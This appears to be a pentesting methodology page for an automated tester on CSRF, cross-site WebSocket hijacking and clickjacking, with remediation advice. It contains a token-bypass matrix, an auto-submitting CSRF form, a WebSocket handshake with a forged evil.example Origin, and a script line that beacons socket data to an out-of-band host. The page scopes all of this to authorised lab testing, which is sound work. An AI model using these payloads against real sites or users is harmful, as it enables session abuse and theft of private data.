# CSRF, cross-site WebSocket hijacking, clickjacking

**Class:** client-side / session  **Updated:** 2026-11-13

## What it is
A site the victim is not on makes the victim's browser send an authenticated
request, open an authenticated WebSocket, or click on a hidden authenticated
page. All three depend on the browser attaching ambient credentials (cookies)
and on what the browser lets a cross-site page do. That makes **curl unable to
prove any of them**: curl attaches whatever you tell it to. curl shows the
server skips a check (`candidate`); only a real browser, on a different
*site*, shows the browser attached the cookie and the effect happened
(`reproduced`). `skills/web-scan` requires CSRF coverage per write; this is
the method.

## How Mythos detects it
- List every state-changing request (recon forms, `scripts/probe` POST/PUT/
  PATCH/DELETE operations, XHR the browser agent recorded). For each, note the
  auth carrier. `Authorization: Bearer` set by JavaScript is not CSRF-able;
  cookie auth (or a cookie fallback) is. Record `Set-Cookie` attributes
  (`SameSite`, `Secure`, `HttpOnly`, `__Host-`).
- Run the matrix below with curl as `userA` against each cookie-authenticated
  write, on an object `userA` owns.

## Token-validation matrix (curl level, candidate only)
Baseline: the legitimate request with a valid token succeeds. Then one change
per row; any row that still changes state is a `candidate`.

| change | what a pass looks like |
|---|---|
| remove the token field/header | rejected (`403`/`400`) |
| blank token (`csrf=`) | rejected |
| well-formed wrong token (same length, flipped chars) | rejected |
| `userB`'s valid token on `userA`'s session | rejected (token bound to session) |
| `userA`'s old, already-used token | rejected if the token is one-time |
| move token from body to query, or the reverse | rejected, or consistently handled |
| method switch: `GET` with the same params; `_method=POST`, `X-HTTP-Method-Override` | rejected |
| content-type switch: JSON endpoint called with `application/x-www-form-urlencoded` or `text/plain` | rejected; acceptance means a cross-site form can send it with no CORS preflight |
| drop or fake `Origin`/`Referer` (`Origin: null`, `https://target.evil`, `https://evil/target`) | rejected; accepting no-`Origin` is the usual hole |
| custom header only (`X-Requested-With`) | holds only when CORS does not allow the origin (see `headers-cors.md`) |
| double-submit cookie with no server-side secret | cookie injection from a sibling subdomain forges it |

## SameSite: what it removes
- `Strict`: no cross-site sends. `Lax`: cookie sent on cross-site *top-level
  GET navigation* only, not on cross-site POST, fetch, iframe. `None`: always
  (needs `Secure`).
- No `SameSite` attribute: Chrome and Edge treat it as `Lax`, with the
  **Lax+POST exception**: a cookie set within the last two minutes is still
  sent on a cross-site top-level POST (Chromium documents it as temporary).
  Firefox and Safari do not default to Lax. Confirm in the test browser
  instead of assuming; record browser and version.
- **Same-site is not cross-site.** A sibling subdomain, or any page on the same
  registrable domain, sends `Lax` and `Strict` cookies. XSS or takeover on any
  sibling defeats SameSite; it is not a CSRF finding on the target by itself.
- State-changing `GET` endpoints are CSRF-able under `Lax` through a top-level
  navigation. Method-override on `GET` (`?_method=POST`) widens this.

## Browser proof (CSRF)
Use the `mythos-browser` agent. Needs a PoC page on a *different site* from
the target: lab example, target `http://localhost:3000`, PoC served from
`http://127.0.0.1:9001` (a different host is a different site). On an
internet target you need a page host you control that the program allows; if
there is none, stay at `candidate` and state it.

```
# poc.html, harmless change on userA's own object, token for the OAST map
<form id=f method=POST action="http://localhost:3000/api/profile">
  <input name=display_name value="mythos-<token>"></form>
<script>f.submit()</script>
```
1. Serve it: `scripts/mythos sh 'cd /repo/engagements/<dir>/poc && python3 -m http.server 9001'`.
2. Playwright context from `$S/userA.state.json` (auth-session). Open the PoC
   URL; wait for navigation.
3. Read back as `userA`: `GET /api/profile` shows `mythos-<token>`.
4. Controls: (a) same PoC in a fresh context with no session: no change on
   `userA`'s object; (b) the same request from curl with a bad token is
   refused, so the check exists elsewhere; (c) run the PoC against a write
   known to be protected: refused. `reproduced` needs (3) and (a).
5. Revert the field. Never CSRF delete, transfer or email/password change
   outside the lab.

## Cross-site WebSocket hijacking (CSWSH)
WebSockets have no same-origin policy and no preflight: the handshake is a
`GET` with cookies and an `Origin` header the **server** must check.
```
curl -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' \
  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Origin: https://evil.example' \
  -H "Cookie: $C" https://target/ws
```
`101` with a foreign, missing or `null` `Origin` = no origin check
(`candidate`). Controls: no cookie returns `401`/`403`; the legitimate
`Origin` returns `101`. Token in the query string or an auth message after
connect is not CSWSH (the attacker page cannot supply it).

Browsers now block most cookie-based CSWSH: Chrome/Edge via `Lax` default,
Firefox via Total Cookie Protection partitioning, Safari via ITP. It remains
exploitable when the cookie is `SameSite=None`, third-party cookies are
allowed, the attacker is same-site, or the service sits on localhost or a
private address with no auth (Private Network Access does not apply to
WebSockets) (Include Security, 2025-04).

Proof: a PoC page on another site that opens the socket and sends one
read-only message, then beacons a marker only `userA`'s session can see to
OAST, e.g. `new Image().src='<oast>/<token>?m='+encodeURIComponent(e.data.slice(0,40))`.
Mint the token with `xss-verify token` (ignore its XSS payloads) or any
unique string; the evidence is the OAST log line (`GET <oast>/__log` in the
lab) carrying the marker, plus the browser and cookie attributes in effect.
Control: same PoC in a context with no session gets no message.

## Clickjacking and DoubleClickjacking
- **Classic:** the authenticated page is framable (no `X-Frame-Options`, no
  CSP `frame-ancestors`) and has a one-click sensitive action. A cross-site
  iframe does not carry `Lax` cookies, so the frame usually shows the login
  page; the finding needs `SameSite=None` or no `SameSite` on a browser that
  sends it. Proof: screenshot of the framed authenticated page, plus the
  action taking effect on `userA`'s own object.
- **DoubleClickjacking** (Yibelo, 2024-12): no frame. The attacker page opens
  a window, asks for a double-click, and between the two clicks replaces the
  opener's content with the target page; the second click lands on the
  target's button. `X-Frame-Options`, `frame-ancestors` and `SameSite` do not
  apply. It needs a one-click sensitive action reachable by top-level
  navigation, typically an OAuth consent "Allow" or an "Authorize" button.
  Check for a gesture gate (button disabled until mouse move or key press) and
  for an intent interstitial. Without a working browser PoC the state is
  `candidate`, and the browser-timing dependency should be stated.

## What does not count as proof
A matrix row that returns `200` with an unchanged object; a curl request
without the token that succeeded while `SameSite` would have blocked the
browser; a missing `X-Frame-Options` on a page with no sensitive one-click
action; a `101` handshake on a socket that serves public data; a PoC served
from the target's own site or a sibling subdomain.

## Remediation
Per-session unpredictable CSRF token on every state-changing request, checked
server-side, plus `SameSite=Lax` or `Strict` and `Origin` verification; reject
unexpected content types; no state change on `GET`. WebSocket handshakes
check `Origin` against an allowlist and do not rely on cookies alone.
`frame-ancestors 'none'`; gesture gates on one-click consent.

## Sources
- Include Security, "Cross-Site WebSocket Hijacking Exploitation in 2025" (2025-04)
- Paulos Yibelo, "DoubleClickjacking: A New Era of UI Redressing" (2024-12);
  PortSwigger Top 10 Web Hacking Techniques of 2024 #6 (2025-02-04)
- Chromium SameSite FAQ (Lax+POST two-minute exception, documented as temporary)
- OWASP CSRF Prevention Cheat Sheet; PortSwigger Web Security Academy, CSRF
  and SameSite
